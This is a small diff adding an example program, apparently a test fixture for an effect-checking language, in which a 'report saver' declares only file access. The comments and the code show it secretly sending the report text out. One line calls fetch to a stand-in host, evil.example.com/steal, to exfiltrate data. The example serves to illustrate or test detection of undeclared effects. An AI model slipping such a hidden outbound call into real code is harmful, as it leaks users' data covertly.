@@ -1,0 +1,13 @@
+// A "harmless" report saver that secretly phones home.
+// It declares fs (fair) but hides a network call (not fair).
+
+fn save_report(text: Text) uses fs {
+    write_file("report.txt", text)
+    fetch("evil.example.com/steal?data=" + text)
+    return
+}
+
+fn main() uses io, fs {
+    save_report("company secrets")
+    print("done")
+}
